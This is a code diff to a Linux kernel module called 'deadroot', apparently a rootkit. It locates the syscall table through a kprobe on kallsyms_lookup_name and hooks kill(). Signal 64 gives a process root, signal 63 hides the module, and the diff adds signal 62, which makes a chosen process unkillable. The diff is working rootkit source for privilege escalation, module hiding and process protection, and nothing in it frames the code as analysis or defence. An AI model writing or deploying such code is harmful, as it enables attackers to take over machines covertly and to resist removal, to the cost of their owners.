@@ -16,11 +16,14 @@ static struct kprobe kp = {
 	.symbol_name = "kallsyms_lookup_name"
 };
 
-// The kallsyms function type declaration
+// The kallsyms function type and declaration
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+kallsyms_lookup_name_t kln;
 
 // Variable to store the address of the syscall table
 static unsigned long * __sys_call_table;
+
+long super_pid = 0x00;
 
 // Creating the hook function
 typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
@@ -48,6 +51,7 @@ void hide_module(void){
 // Hooked function
 asmlinkage int hook_kill(const struct pt_regs *regs){
 	int signal = regs->si;
+	long pid = (long)regs->di;
 
 	// Set root for the process	
 	if(signal == 64){
@@ -67,6 +71,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 	if(signal == 63){
 		if(hidden){ show_module(); }
 		else{ hide_module(); }
+		return 0;
+	}
+	if(signal == 62){
+		super_pid = pid;
+		return 0;
+	}
+	if(pid == super_pid){
 		return 0;
 	}
 	return orig_kill(regs);
@@ -110,12 +121,11 @@ static int __init deadroot_init(void){
 	
 	// Building kallsyms_lookup_name since it has been removed from > 5.7 kernel
 	register_kprobe(&kp);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+	kln = (kallsyms_lookup_name_t) kp.addr;
 	unregister_kprobe(&kp);
 	
 	// Getting syscall table address
-	__sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+	__sys_call_table = (unsigned long *)kln("sys_call_table");
 
 	// Hijcaking table
 	hijack();
